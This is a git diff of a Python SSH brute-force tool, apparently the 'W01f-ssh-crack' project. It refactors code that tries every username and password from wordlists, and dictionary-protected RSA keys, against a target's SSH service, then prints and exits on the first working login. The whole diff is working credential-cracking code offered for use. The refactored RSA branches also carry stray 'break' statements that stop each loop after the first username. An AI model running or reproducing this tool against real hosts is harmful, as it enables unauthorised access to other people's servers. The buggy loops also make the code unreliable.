@@ -12,6 +12,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.header import Header
 from typing import Callable
+import time
 
 AUTHOR = "W01fh4cker"
 REPO = "https://github.com/W01fh4cker/W01f-ssh-crack"
@@ -54,79 +55,71 @@ def getConfig(section: str, key: str, stmpPathConf: str) -> str:
     config.read(stmpPathConf)
     return config.get(section, key)
 
+def Successed(username: str, password: str) -> None:
+    print(f"[√]SSH连接成功! 账号: {username} 密码为：{password}")
+    exit(0)
+
+def TryRsaSSHConnection(hostname: str, SSHport: int, username: str, id_rsa_filePath: str, Rsa_password: str) -> tuple[bool,str,str]:
+    try:
+        ssh_client = paramiko.SSHClient()
+        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        id_rsa_filePath = id_rsa_filePath if id_rsa_filePath is not None else '/home/super/.ssh/id_rsa'
+        local_key = paramiko.RSAKey.from_private_key_file(id_rsa_filePath, password=Rsa_password)
+        ssh_client.connect(hostname, port=SSHport, username=username, pkey=local_key)
+        return True , username, Rsa_password
+    except Exception:
+        return False , username, Rsa_password
+    finally:
+        ssh_client.close()
+
+def TrySSHConnection(hostname: str, SSHport: int, username: str, password: str) -> tuple[bool,str,str]:
+    try:
+        print(fr"[!]尝试账号: {username} 密码：{password}")
+        ssh_client = paramiko.SSHClient()
+        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh_client.connect(hostname, port=SSHport, username=username, password=password)
+        return True , username, password
+    except Exception:
+        return False , username, password
+    finally:
+        ssh_client.close()
+
 def sshClientConnection(hostname:str, SSHport: int):
-    ssh_client = paramiko.SSHClient()
-    ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
     with open("username.txt", 'r', encoding='utf-8') as f:
         user_name = f.readlines()
     with open("password.txt", 'r', encoding='utf-8') as f:
         pass_word = f.readlines()
     for username in user_name:
         for password in pass_word:
-            try:
-                ssh_client.connect(hostname, port=SSHport, username=str(username), password=str(password))
-                stdin, stdout, stderr = ssh_client.exec_command('whoami',timeout=10)
-                print(stdout.read().decode('utf-8'))
-                print(fr"[√]SSH连接成功! 账号: {username} 密码为：{password}")
-                break
-            except paramiko.SSHException:
-                print(fr"[!]尝试账号: {username} 密码：{password} 失败! 自动跳过...")
+            if TrySSHConnection(hostname, SSHport, username.strip(), password.strip())[0] is True:
+                Successed(username.strip(), password.strip())
+            else:
                 continue
-            except Exception:
-                pass
-            finally:
-                ssh_client.close()
+    print("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。") # 由于succeed 函数会让程序退出，所以当所有登录尝试不成功的时候，这里就会被执行
+    # 后面的同理
 
 def sshRsaConnection(hostname: str, SSHport: int):
+    with open("username.txt", 'r', encoding='utf-8') as f:
+            user_name = f.readlines()
+    with open("password.txt", 'r', encoding='utf-8') as f:
+        pass_word = f.readlines()
     id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径：") 
     flag1 = input("您是否需要指定密码？如需要，请输入y；否则输入n。")
     if(flag1 == 'y'):
-        with open("username.txt", 'r', encoding='utf-8') as f:
-            user_name = f.readlines()
-        with open("password.txt", 'r', encoding='utf-8') as f:
-            pass_word = f.readlines()
         for Rsa_password in pass_word:
             for username in user_name:
-                try:
-                    local_key = paramiko.RSAKey.from_private_key_file(id_rsa_filePath if id_rsa_filePath is not None else '/home/super/.ssh/id_rsa', password=str(Rsa_password))
-                    ssh = paramiko.SSHClient()
-                    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
-                    ssh.connect(hostname,
-                                port=SSHport,
-                                username=username,
-                                pkey=local_key)
-                    stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
-                    print(stdout.read().decode())
-                    print(fr"[√]SSH连接成功! 账号: {username} 密码为：{Rsa_password}")
+                if TryRsaSSHConnection(hostname, SSHport, username.strip(), id_rsa_filePath, Rsa_password.strip())[0] is True:
+                    Successed(username.strip(), Rsa_password.strip())
                     break
-                except paramiko.SSHException:
-                    print(fr"[!]尝试账号: {username} 密码：{Rsa_password} 失败! 自动跳过...")
-                    continue
-                except Exception:
-                    pass
-                finally:
-                    ssh.close()
+                break
+        print("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
     elif(flag1 == 'n'):
-        with open("username.txt", 'r', encoding='utf-8') as f:
-            user_name = f.readlines()
         for username in user_name:
-            try:
-                local_key = paramiko.RSAKey.from_private_key_file('/home/super/.ssh/id_rsa')
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
-                ssh.connect(hostname,
-                            port=22,
-                            username=username,
-                            pkey=local_key)
-                stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
-                print(stdout.read().decode())
-                ssh.close()
-            except paramiko.SSHException:
-                print(fr"[!]尝试账号: {username} 失败! 自动跳过...")
-                continue
-            finally:
-                ssh.close()
-        print(fr"[√]SSH连接成功!账号： {username}")
+            if TryRsaSSHConnection(hostname, SSHport, username.strip(), id_rsa_filePath, None)[0] is True:
+                Successed(username.strip(), None)
+                break
+            break
+        print("[x]所有的字典都尝试完毕，没有找到合适的账号。")
     else:
         print("您的输入有误！")
 
@@ -232,7 +225,9 @@ if __name__ == '__main__':
       # 其实这里我本来想用 match case 语法，但是match case语法在python3.10之后才支持，所以我就用字典来代替了, 提升向后兼容性
 
     mode, stmpPath, hostname, SSHport = parseArgs()
-
+    print(f"[DEBUG]模式：{mode}，目标主机：{hostname}, SSH端口: {SSHport}")
+    print("[DEBUG] 5秒后开始爆破...")
+    time.sleep(5)
     if mode not in modeDict:
         modeDict['default'](f"模式{mode}不存在！")
         print("可指定模式: client、rsa、trans")
